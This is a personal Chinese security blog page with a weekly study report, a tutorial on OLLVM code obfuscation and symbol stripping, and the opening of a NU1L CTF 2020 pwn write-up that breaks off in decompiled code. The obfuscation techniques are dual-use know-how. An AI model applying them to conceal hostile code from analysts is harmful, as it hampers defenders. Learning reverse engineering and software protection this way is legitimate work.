<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/page/2/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-weekly-report-2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/25/weekly-report-2/" class="article-date">
  <time datetime="2020-10-25T04:38:56.000Z" itemprop="datePublished">2020-10-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/life/">life</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/25/weekly-report-2/">weekly-report-2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2020-10-25周报"><a href="#2020-10-25周报" class="headerlink" title="2020-10-25周报"></a>2020-10-25周报</h1><p>这周一总结下来，好像啥也没干， 时间就感觉像水一样流走，自己都不知道每天在干什么….唉…那么这篇周报不管怎样，也要好好写，以前写的周报大多数都删掉了, 从这篇开始，坚持每周都写一下自我总结周报吧。</p>
<h2 id="名句"><a href="#名句" class="headerlink" title="名句"></a>名句</h2><p>人是不能太闲的，闲久了，努力一下就以为在拼命。别说你会尽力，努力，全力，用吃奶的力，这些都不是最大的力，要使出自己的洪荒之力，一个人如果不逼自己一把，永远不知道自己有多优秀。</p>
<h2 id="这周干了什么？"><a href="#这周干了什么？" class="headerlink" title="这周干了什么？"></a>这周干了什么？</h2><p>这周感觉干的事好少好少…荒废的一周…<br>了解了下ollvm代码混淆，准备宣讲会内容和演示, 在演示的时候，自己没准备好和操作失误，差点翻车了。。。<br>星期六本来好好打一下bytectf, 然后中午12点的时候与实验室的人一起k歌去了，在k歌之前，有个pwn题我加入的那支队伍有位我们这届的师傅拿了个一血， 自己<br>当时漏洞点在哪都没找到。。。当天也是geekpwn大赛的举办，我打算看一下直播的，后面去k歌忘看了，晚上回到学校，才知道咱们学校另一个实验室的一位师<br>傅参加了geekpwn,且取得了不错的成绩。。。佩服！！！晚上虽然找到了漏洞，但是不会利用2.31版本的libc，该版本加入了很多的保护机制需要绕过。。。自己没好好研究过2.29的，更别说2.31了。</p>
<h2 id="下周计划干什么"><a href="#下周计划干什么" class="headerlink" title="下周计划干什么?"></a>下周计划干什么?</h2><p>复现 nu1l的赛题</p>
<p>学习libc.2.29利用方式</p>
<p>学习kernel pwn</p>
<p>入门web src</p>
<h2 id="自我反思"><a href="#自我反思" class="headerlink" title="自我反思"></a>自我反思</h2><h3 id="好好学习"><a href="#好好学习" class="headerlink" title="好好学习"></a>好好学习</h3><p>把学校里的课程学好，自己上课不听讲，感觉就是在让时间白白流逝，上课这点时间看ctf书籍也看不深入，做啥啥不是，只能好好学习。</p>
<h3 id="调整心态"><a href="#调整心态" class="headerlink" title="调整心态"></a>调整心态</h3><p>自己从大一到现在，感觉一事无成，是自己太懒和没好好学习的结果，web那边都去大厂实习了，拿到多个src平台的证书，自己感觉就还在原地转圈圈。。。大三的师傅们去年在这个时候拿到了多项比赛奖项，而我却一张也拿不出，努力加油吧，认真学习和整理每次比赛的漏洞利用思路。</p>
<h3 id="看通知"><a href="#看通知" class="headerlink" title="看通知"></a>看通知</h3><p>我感觉每一次学校通知啥，自己都不知道。。。每天晚上看一下班群通知</p>
<h3 id="调整作息规律"><a href="#调整作息规律" class="headerlink" title="调整作息规律"></a>调整作息规律</h3><p>每天有时候半夜3才睡觉, 大部分时间都是12点睡, 然后早上的若没课的话都基本9:30起</p>
<p>调整作息为: 11:40过后睡觉, 7:00起床。</p>
<h3 id="坚持学习英语"><a href="#坚持学习英语" class="headerlink" title="坚持学习英语"></a>坚持学习英语</h3><p>每天早上都去背下四级单词</p>
<h3 id="多多复现与调试一下历年的CVE"><a href="#多多复现与调试一下历年的CVE" class="headerlink" title="多多复现与调试一下历年的CVE"></a>多多复现与调试一下历年的CVE</h3><p>自己在cve方面的相关利用与调试手段十分欠缺，需要多多分析与调试，才能理解其中漏洞利用的原理。</p>
<h3 id="规划自己的时间"><a href="#规划自己的时间" class="headerlink" title="规划自己的时间"></a>规划自己的时间</h3><p>详细计划各个时间段该干什么。有时候我发现自己本来打算做这样事的突然另一件事来了，然后去做另一个事，最后到头来啥事也没完成。。。</p>
<h3 id="学会总结自己"><a href="#学会总结自己" class="headerlink" title="学会总结自己"></a>学会总结自己</h3><p>进入大学以来，我就没好好总结自己，感觉对未来一片迷茫。。。每天都在虚度着。。。以后每天晚上睡觉之前就想想自己今天干了些啥吧，反思自己今天所做的事。</p>
<h3 id="不要和别人互吹"><a href="#不要和别人互吹" class="headerlink" title="不要和别人互吹"></a>不要和别人互吹</h3><p>自己实力又差，干嘛要吹别人如何如何，管好自己才是真的厉害!!!</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/25/weekly-report-2/" data-id="ckhemv81e001wwdcm78ic6dc1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/life/" rel="tag">life</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-against_reverse" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/20/against_reverse/" class="article-date">
  <time datetime="2020-10-20T10:24:50.000Z" itemprop="datePublished">2020-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/reverse/">reverse</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/20/against_reverse/">反逆向分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="反逆向分析"><a href="#反逆向分析" class="headerlink" title="反逆向分析"></a>反逆向分析</h1><h2 id="Ollvm"><a href="#Ollvm" class="headerlink" title="Ollvm"></a>Ollvm</h2><h3 id="0x01-Ollvm介绍"><a href="#0x01-Ollvm介绍" class="headerlink" title="0x01 Ollvm介绍"></a>0x01 Ollvm介绍</h3><p>OLLVM（Obfuscator-LLVM）是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个项目，该项目旨在提供一套<strong>开源的针对LLVM的代码混淆工具</strong>，以增加逆向工程的难度, 只不过Ollvm仅更新到llvm的4.0，2017年开始就没再更新。</p>
<h3 id="0x02-Ollvm混淆介绍"><a href="#0x02-Ollvm混淆介绍" class="headerlink" title="0x02 Ollvm混淆介绍"></a>0x02 Ollvm混淆介绍</h3><p>Ollvm混淆主要分成三种模式，这三种模式主要是流程平坦化，指令替换，以及控制流伪造。</p>
<p><strong>流程平坦化</strong> ：这个模式主要通过将if-else语句替换成do-while语句，然后通过switch语句来对流程的控制，这样就能模糊基本块之间的前后关系。</p>
<p><strong>指令替换</strong> ：这个模式主要通过使用更复杂的指令序列来替换一些标准的二元运算符，从而增加逆向的难度。</p>
<p><strong>控制流伪造</strong> ：这个模式主要是会在一个简单的运算中外包好几层if-else的判断，从而增加逆向的难度。</p>
<blockquote>
<p>对Ollvm有更深入的理解，可参阅论文《Obfuscating C++ programs via control flow flattening》</p>
</blockquote>
<h3 id="0x03-Ollvm编译"><a href="#0x03-Ollvm编译" class="headerlink" title="0x03 Ollvm编译"></a>0x03 Ollvm编译</h3><p>env: arch-linux</p>
<p>使用apt源安装g++和cmake，从github获取ollvm的源码，并进行编译。</p>
<p>Ollvm 6.0: <a target="_blank" rel="noopener" href="https://github.com/yazhiwang/ollvm-tll.git">https://github.com/yazhiwang/ollvm-tll.git</a> (编译成功!)</p>
<p>原版src: <a target="_blank" rel="noopener" href="https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0">https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0</a>  (编译失败!)</p>
<h4 id="ollvm-til编译"><a href="#ollvm-til编译" class="headerlink" title="ollvm-til编译"></a>ollvm-til编译</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release ../ollvm-tll-master</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>



<h4 id="官方编译"><a href="#官方编译" class="headerlink" title="官方编译"></a>官方编译</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> </span><br><span class="line">mkdir build</span><br><span class="line">cmake  -DCMAKE_BUILD_TYPE=Release  -DLLVM_INCLUDE_TESTS=OFF  ../</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<h3 id="0x4-命令介绍"><a href="#0x4-命令介绍" class="headerlink" title="0x4 命令介绍"></a>0x4 命令介绍</h3><h4 id="控制流扁平化"><a href="#控制流扁平化" class="headerlink" title="控制流扁平化"></a>控制流扁平化</h4><p>这个模式主要是把一些if-else语句，嵌套成do-while语句</p>
<p> -mllvm -fla：激活控制流扁平化</p>
<p> -mllvm -split：激活基本块分割。在一起使用时改善展平。</p>
<p> -mllvm -split_num=3：如果激活了传递，则在每个基本块上应用3次。默认值：1</p>
<h4 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h4><p>这个模式主要用功能上等效但更复杂的指令序列替换标准二元运算符(+ , – , &amp; , | 和 ^)</p>
<p> -mllvm -sub：激活指令替换</p>
<p> -mllvm -sub_loop=3：如果激活了传递，则在函数上应用3次。默认值：1</p>
<h4 id="虚假控制流程"><a href="#虚假控制流程" class="headerlink" title="虚假控制流程"></a>虚假控制流程</h4><p>这个模式主要嵌套几层判断逻辑，一个简单的运算都会在外面包几层if-else，所以这个模式加上编译速度会慢很多因为要做几层假的逻辑包裹真正有用的代码。</p>
<p> -mllvm -bcf：激活虚假控制流程<br> -mllvm -bcf_loop=3：如果激活了传递，则在函数上应用3次。默认值：1<br> -mllvm -bcf_prob=40：如果激活了传递，基本块将以40％的概率进行模糊处理。默认值：30</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p> -mllvm -sobf 开启字符串混淆</p>
<p> -mllvm -seed=0xdeadbeaf 指定随机数种子生成器 bcf可以配合下面参数使用</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>对a.c进行混淆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OOOKKKK!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    a ++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(a &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        exec();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/tools/ollvm/bin/clang a.c -mllvm -fla  -mllvm -sobf  -mllvm -bcf  -o a</span><br></pre></td></tr></table></figure>

<p>ida64打开F5</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 *v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 *v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  __int64 *v16; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">bool</span> v28; <span class="comment">// [rsp+45h] [rbp-Bh]</span></span><br><span class="line">  <span class="keyword">bool</span> v29; <span class="comment">// [rsp+46h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">bool</span> v30; <span class="comment">// [rsp+47h] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v28 = (((_BYTE)x_2 - <span class="number">1</span>) * (_BYTE)x_2 &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  v29 = y_3 &lt; <span class="number">10</span>;</span><br><span class="line">  v27 = <span class="number">1567572003</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = v27;</span><br><span class="line">        v25 = v27 + <span class="number">1130483098</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v27 != <span class="number">-1130483098</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v9 = <span class="number">-1065940243</span>;</span><br><span class="line">        <span class="keyword">if</span> ( y_3 &lt; <span class="number">10</span> || (((_BYTE)x_2 - <span class="number">1</span>) * (_BYTE)x_2 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          v9 = <span class="number">-714366873</span>;</span><br><span class="line">        v27 = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      v24 = v26 + <span class="number">1065940243</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v26 != <span class="number">-1065940243</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v27 = <span class="number">-1130483098</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v23 = v26 + <span class="number">714366873</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v26 == <span class="number">-714366873</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v22 = v26 + <span class="number">511865542</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v26 == <span class="number">-511865542</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">-1065940243</span>;</span><br><span class="line">      <span class="keyword">if</span> ( y_3 &lt; <span class="number">10</span> || (((_BYTE)x_2 - <span class="number">1</span>) * (_BYTE)x_2 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        v8 = <span class="number">-1130483098</span>;</span><br><span class="line">      v27 = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v26 + <span class="number">329192939</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v26 == <span class="number">-329192939</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = &amp;v13 - <span class="number">2</span>;</span><br><span class="line">        *((_DWORD *)&amp;v13 - <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v11 = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v11 = *((_DWORD *)&amp;v13 - <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">        v12 = <span class="built_in">printf</span>(&amp;byte_404030);</span><br><span class="line">        v27 = <span class="number">191033970</span>;</span><br><span class="line">        v14 = v12;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v20 = v26 - <span class="number">191033970</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v26 == <span class="number">191033970</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = &amp;v13 - <span class="number">2</span>;</span><br><span class="line">          *((_DWORD *)&amp;v13 - <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          *(_DWORD *)v4 = <span class="number">0</span>;</span><br><span class="line">          *(_DWORD *)v4 = *((_DWORD *)&amp;v13 - <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">          v16 = &amp;v13 - <span class="number">2</span>;</span><br><span class="line">          v5 = <span class="built_in">printf</span>(&amp;byte_404030);</span><br><span class="line">          v6 = <span class="number">-329192939</span>;</span><br><span class="line">          v30 = *(_DWORD *)v16 &gt;= <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( y_3 &lt; <span class="number">10</span> || (((_BYTE)x_2 - <span class="number">1</span>) * (_BYTE)x_2 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            v6 = <span class="number">1347608926</span>;</span><br><span class="line">          v27 = v6;</span><br><span class="line">          v15 = v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v19 = v26 - <span class="number">1347608926</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v26 == <span class="number">1347608926</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = <span class="number">-511865542</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v30 )</span><br><span class="line">              v7 = <span class="number">1700479422</span>;</span><br><span class="line">            v27 = v7;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v18 = v26 - <span class="number">1567572003</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v26 == <span class="number">1567572003</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = <span class="number">-329192939</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v29 || v28 )</span><br><span class="line">                v3 = <span class="number">191033970</span>;</span><br><span class="line">              v27 = v3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v17 = v26 - <span class="number">1700479422</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1700479422</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                exec();</span><br><span class="line">                v27 = <span class="number">-511865542</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上成功实现代码混淆</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://ac.inf.elte.hu/Vol_030_2009/003.pdf">Obfuscating C++ programs via control flow flattening </a></p>
<h2 id="去除符号表"><a href="#去除符号表" class="headerlink" title="去除符号表"></a>去除符号表</h2><p>查看符号表</p>
<p>  readelf -s test</p>
<p>采用strip工具对符号表进行去除</p>
<p>.symtab因为是在调试和链接时有用的，所以，可以从生产的二进制执行文件中移除。可以使用strip。strip是可以移除符号以及节的工具。</p>
<ol>
<li><p>移除.symtab 符号表 以及 .strtab 符号字符串表<br>直接运行</p>
<ul>
<li><code>strip --remove-section=.symtab file_in</code></li>
<li><code>strip --remove-section=.strtab file_in</code></li>
</ul>
</li>
</ol>
<ol start="2">
<li><p>想要让可执行文件没有<code>.dynsym</code>动态链接表，<code>.dynstr</code>动态链接字符表。<br>gcc编译时添加参数，从而使用静态编译。<code>gcc -static</code> 或者 <code>gcc -nostdlib</code></p>
<ul>
<li><code>gcc -nostdlib</code> ：不连接系统标准启动文件和标准库文件，只把指定的文件传递给连接器。</li>
<li><code>gcc -static</code>：在支持动态链接的系统上，阻止连接共享库。该选项在其它系统上 无效。</li>
</ul>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/20/against_reverse/" data-id="ckhemv7z70001wdcma93c53cb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-nu1lctf-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/18/wp-nu1lctf-2020/" class="article-date">
  <time datetime="2020-10-18T12:19:30.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/wp-nu1lctf-2020/">wp-nu1lctf-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="NU1L-2020-WP"><a href="#NU1L-2020-WP" class="headerlink" title="NU1L 2020 WP"></a>NU1L 2020 WP</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>经典的菜单体, 与ddctf的一个pwn非常类似, 打远程超级慢, 打一个小时左右….</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, 